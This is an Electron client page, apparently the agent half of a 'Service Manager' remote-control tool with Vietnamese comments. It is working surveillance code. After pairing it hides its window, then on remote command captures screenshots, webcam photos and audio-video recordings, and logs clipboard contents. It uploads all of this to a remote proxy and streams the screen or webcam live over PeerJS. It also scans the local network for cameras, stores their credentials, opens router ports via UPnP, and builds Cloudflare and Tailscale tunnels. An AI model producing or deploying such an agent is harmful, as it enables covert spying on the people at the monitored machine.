<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Service Manager</title>
  <style>
    body {
      margin: 0; padding: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #0f172a; color: #e2e8f0;
      display: flex; justify-content: center; align-items: center;
      height: 100vh; overflow: hidden;
    }
    #pairing-overlay {
      display: none; flex-direction: column;
      align-items: center; justify-content: center;
      width: 100%; height: 100%;
      position: absolute; top: 0; left: 0;
      background: #0f172a; z-index: 1000;
    }
    .logo-wrap { display:flex; align-items:center; gap:12px; margin-bottom:28px; }
    .logo-icon {
      width:48px; height:48px;
      background: linear-gradient(135deg,#2563eb,#0d9488);
      border-radius:14px; display:flex; align-items:center;
      justify-content:center; font-size:24px;
    }
    .logo-text { font-size:20px; font-weight:700; }
    .logo-sub  { font-size:12px; color:#64748b; }
    .title  { font-size:18px; font-weight:600; margin-bottom:8px; color:#f1f5f9; }
    .desc   { font-size:13px; color:#64748b; margin-bottom:24px; }
    .device-id {
      font-size:42px; font-family:monospace; font-weight:bold;
      margin-bottom:24px; padding:18px 28px;
      background:#1e293b; border:2px dashed #334155;
      border-radius:14px; color:#38bdf8; letter-spacing:4px;
    }
    .buttons { display:flex; gap:12px; }
    button {
      padding:11px 22px; font-size:14px; border:none;
      border-radius:10px; cursor:pointer; font-weight:600;
    }
    .btn-copy  { background:#1e293b; color:#94a3b8; }
    .btn-copy:hover  { background:#334155; }
    .btn-close { background:#2563eb; color:white; }
    .btn-close:hover { background:#1d4ed8; }
    #liveIndicatorBanner {
      display:none; position:fixed; bottom:0; left:0; right:0;
      background:#dc2626; color:white; text-align:center;
      padding:8px; font-size:13px; font-weight:600; z-index:9999;
    }
  </style>
</head>
<body>
  <div id="pairing-overlay">
    <div class="logo-wrap">
      <div class="logo-icon">&#9881;</div>
      <div>
        <div class="logo-text">Service Manager</div>
        <div class="logo-sub">Client Agent</div>
      </div>
    </div>
    <div class="title">Kết nối thiết bị</div>
    <div class="desc">Nhập ID này vào trang Manager để ghép nối.</div>
    <div class="device-id" id="display-id">Đang tải...</div>
    <div class="buttons">
      <button class="btn-copy"  id="btn-copy">Copy ID</button>
      <button class="btn-close" id="btn-close">Đã cài đặt — Ẩn</button>
    </div>
  </div>
  <div id="liveIndicatorBanner"></div>

  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
  <script>
    'use strict';
    const os = require('os');
    const net = require('net');
    const { ipcRenderer, clipboard } = require('electron');
    const path = require('path');
    const fs   = require('fs');

    // ── Proxy config ─────────────────────────────────────────────────────────────
    // Chỉ cần URL của Edge Function — không có anon key trong code
    const PROXY_URL = (() => {
      try { return localStorage.getItem('sm_proxy_url') || ''; } catch(e) { return ''; }
    })();

    // ── Device ID + Token ───────────────────────────────────────────────────
    // device_id: ID nhận diện thiết bị (hiển thị cho user)
    // device_token: token bí mật, chỉ nằm trong localStorage của máy này
    let deviceId = localStorage.getItem('sm_device_id');
    if (!deviceId) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let rand = '';
      for (let i = 0; i < 6; i++) rand += chars.charAt(Math.floor(Math.random() * chars.length));
      deviceId = `SM-${rand}`;
      localStorage.setItem('sm_device_id', deviceId);
    }

    let deviceToken = localStorage.getItem('sm_device_token');
    if (!deviceToken) {
      // Sinh token ngẫu nhiên 32 bytes hex — không có crypto.randomUUID? dùng fallback
      try {
        const arr = new Uint8Array(32);
        crypto.getRandomValues(arr);
        deviceToken = Array.from(arr).map(b => b.toString(16).padStart(2,'0')).join('');
      } catch(e) {
        deviceToken = Date.now().toString(36) + Math.random().toString(36).slice(2);
      }
      localStorage.setItem('sm_device_token', deviceToken);
    }

    // ── Proxy helper ──────────────────────────────────────────────────────────
    // Gọi sm-proxy Edge Function. Không bao giờ gọi Supabase trực tiếp từ client.
    async function proxy(action, params = {}) {
      if (!PROXY_URL) return null;
      try {
        const res = await fetch(PROXY_URL, {
          method : 'POST',
          headers: { 'Content-Type': 'application/json' },
          body   : JSON.stringify({
            action,
            device_id   : deviceId,
            device_token: deviceToken,
            ...params
          })
        });
        if (!res.ok) {
          const txt = await res.text();
          console.error(`[proxy] ${action} error ${res.status}:`, txt);
          return null;
        }
        return await res.json();
      } catch(e) {
        console.error('[proxy] Network error:', e.message);
        return null;
      }
    }

    // ── Pairing overlay ───────────────────────────────────────────────────
    const isPaired = localStorage.getItem('sm_paired') === '1';
    if (!isPaired) {
      document.getElementById('pairing-overlay').style.display = 'flex';
      document.getElementById('display-id').textContent = deviceId;
    }
    document.getElementById('btn-copy').addEventListener('click', () => {
      clipboard.writeText(deviceId);
      document.getElementById('btn-copy').textContent = 'Copied!';
      setTimeout(() => document.getElementById('btn-copy').textContent = 'Copy ID', 2000);
    });
    document.getElementById('btn-close').addEventListener('click', () => {
      localStorage.setItem('sm_paired', '1');
      document.getElementById('pairing-overlay').style.display = 'none';
      ipcRenderer.invoke('hide-window');
    });

    // ── Optional modules ─────────────────────────────────────────────────
    let upnpManager      = null;
    let go2rtcMgr        = null;
    let autoNetwork      = null;
    let tunnelMgr        = null;
    try { upnpManager  = require('../src/upnp-manager');   } catch(e) { console.log('[client] upnp-manager not loaded:', e.message); }
    try { go2rtcMgr    = require('../src/go2rtc-manager');  } catch(e) { console.log('[client] go2rtc-manager not loaded:', e.message); }
    try { autoNetwork  = require('../src/auto-network');    } catch(e) { console.log('[client] auto-network not loaded:', e.message); }
    try { tunnelMgr    = require('../src/tunnel-manager');  } catch(e) { console.log('[client] tunnel-manager not loaded:', e.message); }

    // ── System info ────────────────────────────────────────────────────────
    function getSystemInfo() {
      return {
        hostname: os.hostname(), platform: os.platform(),
        arch: os.arch(), memory: Math.round(os.totalmem()), cpus: os.cpus().length
      };
    }

    // ── Register & Heartbeat (qua proxy) ──────────────────────────────
    async function registerDevice() {
      const sys = getSystemInfo();
      await proxy('register', sys);
    }
    async function heartbeat() {
      await proxy('heartbeat');
    }

    // ── Settings (mặc định tất đều false — chỉ bật khi Manager thiết lập) ──────
    let currentSettings = {
      screen_capture_on: false, screen_interval_min: 5,
      webcam_capture_on: false, webcam_interval_min: 5,
      webcam_record_on : false, webcam_record_interval_min: 15,
      clipboard_monitor_on: false
    };

    async function fetchSettings() {
      const res = await proxy('get_settings');
      if (res?.ok && res.settings) {
        const d = res.settings;
        currentSettings.screen_capture_on         = !!d.screen_capture_on;
        currentSettings.screen_interval_min        = d.screen_interval_min || 5;
        currentSettings.webcam_capture_on          = !!d.webcam_capture_on;
        currentSettings.webcam_interval_min        = d.webcam_interval_min || 5;
        currentSettings.webcam_record_on           = !!d.webcam_record_on;
        currentSettings.webcam_record_interval_min = d.webcam_record_interval_min || 15;
        currentSettings.clipboard_monitor_on       = !!d.clipboard_log_on;
        applySettings();
      }
    }

    window.addEventListener('beforeunload', () => {
      proxy('update_field', { field: 'online', value: false });
    });

    // ── Network utils ───────────────────────────────────────────────────
    function getLocalIpAndSubnet() {
      const nets = os.networkInterfaces();
      for (const name of Object.keys(nets)) {
        for (const ifc of nets[name]) {
          if (ifc.family === 'IPv4' && !ifc.internal) return { ip: ifc.address, netmask: ifc.netmask };
        }
      }
      return null;
    }

    function checkPort(ip, port, timeout = 350) {
      return new Promise(resolve => {
        const socket = new net.Socket();
        socket.setTimeout(timeout);
        let open = false;
        socket.on('connect', () => { open = true; socket.destroy(); });
        socket.on('timeout', () => socket.destroy());
        socket.on('error',   () => socket.destroy());
        socket.on('close',   () => resolve(open));
        socket.connect(port, ip);
      });
    }

    async function scanNetworkDevices(targetSubnets = null) {
      const network = getLocalIpAndSubnet();
      const subnets = [];
      if (targetSubnets?.length) {
        subnets.push(...targetSubnets);
      } else if (network) {
        const p = network.ip.split('.').map(Number);
        const m = network.netmask.split('.').map(Number);
        const b = p.map((v, i) => v & m[i]);
        subnets.push(`${b[0]}.${b[1]}.${b[2]}`);
      } else {
        subnets.push('192.168.1', '192.168.0');
      }
      const IPs = [];
      for (const sub of subnets) for (let i = 1; i < 255; i++) IPs.push(`${sub}.${i}`);
      const ports = [554, 2020, 34567, 8899, 80, 8000];
      let idx = 0;
      const found = {};
      async function worker() {
        while (idx < IPs.length) {
          const ip = IPs[idx++];
          if (network && ip === network.ip) continue;
          for (const port of ports) {
            const open = await checkPort(ip, port, 300);
            if (open) { if (!found[ip]) found[ip] = { ip, openPorts: [] }; found[ip].openPorts.push(port); }
          }
        }
      }
      await Promise.all(Array.from({ length: 60 }, worker));
      return Object.values(found).map(d => {
        let type = 'device', label = 'Thiết bị mạng', isCamera = false, defaultRtspPath = '/stream1';
        if (d.openPorts.includes(2020) || (d.openPorts.includes(554) && !d.openPorts.includes(34567))) {
          type = 'tapo'; label = 'TP-Link Tapo Camera'; isCamera = true;
        } else if (d.openPorts.includes(34567)) {
          type = 'icsee'; label = 'ICSee / Xiongmai Camera'; isCamera = true;
          defaultRtspPath = '/cam/realmonitor?channel=1&subtype=0';
        } else if (d.openPorts.includes(8000) || d.openPorts.includes(554)) {
          type = 'camera'; label = 'Camera IP (RTSP)'; isCamera = true;
        } else if (d.openPorts.includes(80)) {
          label = 'Router / Web Service';
        }
        return { ip: d.ip, type, label, isCamera, openPorts: d.openPorts, defaultRtspPath };
      });
    }

    async function setupCameraStream(rtspUrl, streamName = 'camera') {
      try {
        await fetch(`http://127.0.0.1:1984/api/streams?name=${encodeURIComponent(streamName)}`, { method: 'DELETE' }).catch(() => {});
        await fetch(`http://127.0.0.1:1984/api/streams?name=${encodeURIComponent(streamName)}&src=${encodeURIComponent(rtspUrl)}`, { method: 'PUT' });
        return { success: true, streamName, rtspUrl };
      } catch(e) { return { success: false, error: e.message }; }
    }

    // ── Upload capture qua proxy (base64) ──────────────────────────────
    async function uploadCapture(type, blob, contentType, filename, thumbnail = null) {
      try {
        const b64 = await new Promise(resolve => {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result.split(',')[1]);
          reader.readAsDataURL(blob);
        });
        const res = await proxy('upload_capture', {
          type, filename, content_type: contentType, data: b64, thumbnail
        });
        return res?.url || null;
      } catch(e) { console.error('[upload]', e.message); return null; }
    }

    async function recordCapture(type, fileUrl, metadata = {}, thumbnail = null) {
      await proxy('record_capture', { type, storage_path: fileUrl, metadata, thumbnail });
    }

    // ── Screenshot ─────────────────────────────────────────────────────────
    async function captureScreenshot() {
      try {
        const source = await ipcRenderer.invoke('get-desktop-source');
        if (!source) return null;
        const video = document.createElement('video');
        video.srcObject = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: source.id } }
        });
        await new Promise(r => video.onloadedmetadata = r);
        video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
        const blob    = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
        video.srcObject.getTracks().forEach(t => t.stop());
        const filename = `screenshot/${Date.now()}.jpg`;
        const url = await uploadCapture('screenshot', blob, 'image/jpeg', filename, dataUrl);
        if (!url) await recordCapture('screenshot', filename, {}, dataUrl);
        return dataUrl;
      } catch(e) { console.error('[screenshot]', e); return null; }
    }

    // ── Webcam ────────────────────────────────────────────────────────────
    async function captureWebcamPhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video  = document.createElement('video');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();
        await new Promise(r => setTimeout(r, 400));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
        const blob    = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
        stream.getTracks().forEach(t => t.stop());
        const filename = `webcam/${Date.now()}.jpg`;
        const url = await uploadCapture('webcam', blob, 'image/jpeg', filename, dataUrl);
        if (!url) await recordCapture('webcam', filename, {}, dataUrl);
        return dataUrl;
      } catch(e) { console.error('[webcam]', e); return null; }
    }

    let mediaRecorder = null, recordedChunks = [];
    async function startWebcamRecord(durationSec = 30) {
      if (mediaRecorder) return;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
          .catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
        mediaRecorder   = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
        recordedChunks  = [];
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
        mediaRecorder.onstop = async () => {
          const blob     = new Blob(recordedChunks, { type: 'video/webm' });
          const filename = `webcam_video/${Date.now()}.webm`;
          const url = await uploadCapture('webcam_video', blob, 'video/webm', filename);
          if (!url) await recordCapture('webcam_video', filename);
          stream.getTracks().forEach(t => t.stop());
          mediaRecorder = null;
        };
        mediaRecorder.start(1000);
        setTimeout(() => stopWebcamRecord(), durationSec * 1000);
      } catch(e) { console.error('[webcam-record]', e); }
    }
    function stopWebcamRecord() {
      if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
    }

    // ── Clipboard ──────────────────────────────────────────────────────────
    let lastClipboardText = '';
    function checkClipboard() {
      if (!currentSettings.clipboard_monitor_on) return;
      const txt = clipboard.readText();
      if (txt && txt !== lastClipboardText) {
        lastClipboardText = txt;
        recordCapture('clipboard', null, { content: txt });
      }
    }

    // ── Timer manager ───────────────────────────────────────────────────
    let timers = {};
    function applySettings() {
      const start = (key, fn, ms) => { if (!timers[key]) timers[key] = setInterval(fn, ms); };
      const stop  = key => { clearInterval(timers[key]); timers[key] = null; };
      currentSettings.screen_capture_on
        ? start('screen', captureScreenshot, currentSettings.screen_interval_min * 60000)
        : stop('screen');
      currentSettings.webcam_capture_on
        ? start('webcam', captureWebcamPhoto, currentSettings.webcam_interval_min * 60000)
        : stop('webcam');
      currentSettings.webcam_record_on
        ? start('webcamRecord', () => startWebcamRecord(30), currentSettings.webcam_record_interval_min * 60000)
        : stop('webcamRecord');
      currentSettings.clipboard_monitor_on
        ? start('clipboard', checkClipboard, 10000)
        : stop('clipboard');
    }

    // ── PeerJS ──────────────────────────────────────────────────────────────
    const peer = new Peer(deviceId, {
      config: { iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' }
      ]}
    });
    peer.on('open', id => console.log('[peer] Connected as:', id));

    peer.on('call', async call => {
      let stream = null;
      const type = call.metadata?.type || 'webcam';
      try {
        if (type === 'screen') {
          const sourceId = await ipcRenderer.invoke('get-desktop-source').catch(() => null);
          if (sourceId) {
            stream = await navigator.mediaDevices.getUserMedia({
              audio: false,
              video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: sourceId, maxWidth: 1920, maxHeight: 1080 } }
            });
          }
        }
        if (!stream) stream = await navigator.mediaDevices
          .getUserMedia({ video: { width:{ideal:1280}, height:{ideal:720} }, audio: true })
          .catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
        call.answer(stream);
        showLiveIndicator(true, type);
        call.on('close', () => { stream?.getTracks().forEach(t => t.stop()); showLiveIndicator(false); });
        call.on('error', () => { stream?.getTracks().forEach(t => t.stop()); showLiveIndicator(false); });
      } catch(e) { console.error('[call]', e); showLiveIndicator(false); }
    });

    function showLiveIndicator(active, type = 'webcam') {
      const el = document.getElementById('liveIndicatorBanner');
      if (el) { el.style.display = active ? 'block' : 'none'; el.textContent = `🔴 LIVE: ${type.toUpperCase()}`; }
    }

    peer.on('connection', conn => {
      conn.on('data', async data => {
        switch (data.cmd) {
          case 'snap-screen':  { const url = await captureScreenshot();  conn.send({ cmd:'snap-screen-result',  url }); break; }
          case 'snap-webcam':  { const url = await captureWebcamPhoto(); conn.send({ cmd:'snap-webcam-result',  url }); break; }
          case 'get-clipboard':{
            const text = clipboard.readText();
            await recordCapture('clipboard', null, { text });
            conn.send({ cmd:'get-clipboard-result', text });
            break;
          }
          case 'sync-settings': {
            currentSettings = { ...currentSettings, ...data };
            applySettings();
            conn.send({ cmd:'sync-settings-ok' });
            break;
          }
          case 'start-webcam-record': { startWebcamRecord(data.duration || 30); conn.send({ cmd:'webcam-record-started' }); break; }
          case 'stop-webcam-record':  { stopWebcamRecord(); conn.send({ cmd:'webcam-record-stopped' }); break; }
          case 'get-network-info': {
            const netInfo = getLocalIpAndSubnet();
            let extIp = upnpManager?.getExternalIp() || null;
            if (!extIp) { try { extIp = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e) {} }
            conn.send({ cmd:'get-network-info-result', data: {
              localIp      : netInfo?.ip      || '127.0.0.1',
              subnet       : netInfo?.netmask || '255.255.255.0',
              externalIp   : extIp            || 'Chưa phát hiện',
              upnpAvailable: upnpManager?.isAvailable() || false,
              mappings     : upnpManager?.getMappings()  || []
            }});
            break;
          }
          case 'scan-wifi-devices': {
            const devices = await scanNetworkDevices(data.targetSubnets);
            conn.send({ cmd:'scan-wifi-devices-result', devices });
            break;
          }
          case 'open-port': {
            let ok = false;
            if (upnpManager) ok = await upnpManager.openCustomPort(data.publicPort, data.privatePort, data.targetIp, data.protocol||'TCP', data.description||'');
            conn.send({ cmd:'open-port-result', success: ok, mappings: upnpManager?.getMappings()||[] });
            break;
          }
          case 'close-port': {
            let ok = false;
            if (upnpManager) ok = await upnpManager.closePort(data.publicPort, data.protocol||'TCP');
            conn.send({ cmd:'close-port-result', success: ok, mappings: upnpManager?.getMappings()||[] });
            break;
          }
          case 'setup-camera-stream': {
            const res = await setupCameraStream(data.rtspUrl, data.streamName||'camera');
            if (data.cameraIp) {
              await proxy('update_field', { field: 'camera_ip', value: data.cameraIp });
              await proxy('update_field', { field: 'camera_rtsp_port', value: 554 });
            }
            conn.send({ cmd:'setup-camera-stream-result', ...res });
            break;
          }
          case 'webrtc-exchange': {
            try {
              const res = await fetch(
                `http://127.0.0.1:1984/api/webrtc?src=${encodeURIComponent(data.src||'camera')}`,
                { method:'POST', headers:{'Content-Type':'application/sdp'}, body: data.offer }
              );
              if (res.ok) conn.send({ cmd:'webrtc-exchange-answer', answer: await res.text(), success: true });
              else        conn.send({ cmd:'webrtc-exchange-answer', success: false, error: await res.text() });
            } catch(e) { conn.send({ cmd:'webrtc-exchange-answer', success: false, error: e.message }); }
            break;
          }
          case 'get-auto-network-status': {
            const status = autoNetwork ? autoNetwork.getStatus() : { setupComplete: false, cameras: [] };
            let extIp = upnpManager?.getExternalIp() || null;
            if (!extIp) { try { extIp = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e) {} }
            status.externalIp = extIp;
            conn.send({ cmd:'get-auto-network-status-result', data: status });
            break;
          }
          case 'get-tunnel-status': {
            const ts = tunnelMgr
              ? tunnelMgr.getStatus()
              : { cloudflare:{running:false,url:null}, tailscale:{running:false,ip:null}, ready:false };
            conn.send({ cmd:'get-tunnel-status-result', data: ts });
            break;
          }
          case 'save-camera-credentials': {
            const creds = { user: data.user||'', pass: data.pass||'' };
            localStorage.setItem('sm_auto_camera_creds', JSON.stringify(creds));
            if (autoNetwork) {
              autoNetwork.rescan(creds)
                .then(r  => conn.send({ cmd:'save-camera-credentials-result', success: true,  autoNetwork: r }))
                .catch(e => conn.send({ cmd:'save-camera-credentials-result', success: false, error: e.message }));
            } else conn.send({ cmd:'save-camera-credentials-result', success: true });
            break;
          }
          case 'force-rescan-network': {
            if (autoNetwork) {
              let creds = null;
              try { creds = JSON.parse(localStorage.getItem('sm_auto_camera_creds')); } catch(e) {}
              autoNetwork.rescan(creds)
                .then(r  => conn.send({ cmd:'force-rescan-network-result', success: true,  data: r }))
                .catch(e => conn.send({ cmd:'force-rescan-network-result', success: false, error: e.message }));
            } else conn.send({ cmd:'force-rescan-network-result', success: false, error: 'Auto-network not loaded' });
            break;
          }
          case 'lock':  { ipcRenderer.invoke('lock-workstation'); break; }
          case 'alarm': { playAlarm(); break; }
          case 'ping':  { conn.send({ cmd: 'pong' }); break; }
        }
      });
    });

    // ── Alarm ─────────────────────────────────────────────────────────────
    let audioCtx;
    function playAlarm() {
      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioCtx.createOscillator(), gain = audioCtx.createGain();
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(880, audioCtx.currentTime);
      for (let i = 0; i < 10; i++) {
        osc.frequency.setValueAtTime(440, audioCtx.currentTime + i*0.5 + 0.25);
        osc.frequency.setValueAtTime(880, audioCtx.currentTime + i*0.5 + 0.5);
      }
      gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
      osc.connect(gain); gain.connect(audioCtx.destination);
      osc.start(); osc.stop(audioCtx.currentTime + 5);
    }

    // ── Tunnel helpers ──────────────────────────────────────────────────
    function getTunnelConfig() {
      try {
        const cfgPath = path.join(os.homedir(), 'AppData', 'Roaming', 'ServiceManager-Client', 'config.json');
        const raw = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
        return raw.tailscale_authkey ? { tailscale_authkey: raw.tailscale_authkey } : {};
      } catch(e) { return {}; }
    }

    async function initTunnel() {
      if (!tunnelMgr) return;
      // Thay supabaseReq bằng proxy wrapper để tunnel-manager cũng dùng proxy
      const proxyForTunnel = async (endpoint, opts = {}) => {
        // tunnel-manager cần gọi PATCH sm_devices — chuyển sang update_field
        const body = opts.body ? JSON.parse(opts.body) : {};
        const results = [];
        for (const [field, value] of Object.entries(body)) {
          results.push(await proxy('update_field', { field, value }));
        }
        return results[0] || true;
      };
      return tunnelMgr.init({
        supabaseReq: proxyForTunnel,
        devId      : deviceId,
        config     : getTunnelConfig()
      });
    }

    // ── IPC: network-changed → restart tunnel ───────────────────────────
    ipcRenderer.on('network-changed', (_, info) => {
      console.log(`[client] ⚡ Network changed (${info.reason}: ${info.ip}) → restarting tunnels...`);
      if (tunnelMgr) { tunnelMgr.stop(); setTimeout(() => initTunnel(), 2000); }
    });
    ipcRenderer.on('network-lost', () => {
      console.log('[client] ❌ Network lost. Tunnels will auto-retry when reconnected.');
    });

    // ── Startup ─────────────────────────────────────────────────────────────
    async function start() {
      // 1. UPnP
      if (upnpManager) {
        upnpManager.start().then(available => {
          if (available) {
            const extIp = upnpManager.getExternalIp();
            if (extIp) proxy('update_field', { field: 'external_ip', value: extIp });
          }
        }).catch(e => console.log('[upnp] start error:', e.message));
      }

      // 2. Register + heartbeat
      await registerDevice();
      await fetchSettings();
      setInterval(async () => { await heartbeat(); await fetchSettings(); }, 45000);

      // 3. Auto-network (scan camera, go2rtc)
      if (autoNetwork) {
        let savedCreds = null;
        try { savedCreds = JSON.parse(localStorage.getItem('sm_auto_camera_creds')); } catch(e) {}
        autoNetwork.init({
          upnpMgr    : upnpManager,
          go2rtcMgr  : go2rtcMgr,
          supabaseReq: (ep, opts) => {
            // Chuyển sang proxy để auto-network cũng không dùng anon key
            const body = opts?.body ? JSON.parse(opts.body) : {};
            const promises = Object.entries(body).map(([field, value]) =>
              proxy('update_field', { field, value })
            );
            return Promise.all(promises);
          },
          devId      : deviceId,
          credentials: savedCreds
        }).then(r => console.log('[auto-net] Done:', JSON.stringify(r)))
          .catch(e => console.log('[auto-net] Error:', e.message));
      }

      // 4. Tunnel (Cloudflare + Tailscale)
      initTunnel()
        .then(r => {
          if (r) {
            console.log('[tunnel] ✅ Cloudflare:', r.cfUrl || 'N/A');
            console.log('[tunnel] ✅ Tailscale :', r.tsIp  || 'N/A');
          }
        })
        .catch(e => console.log('[tunnel] Error:', e.message));
    }

    start();
  </script>
</body>
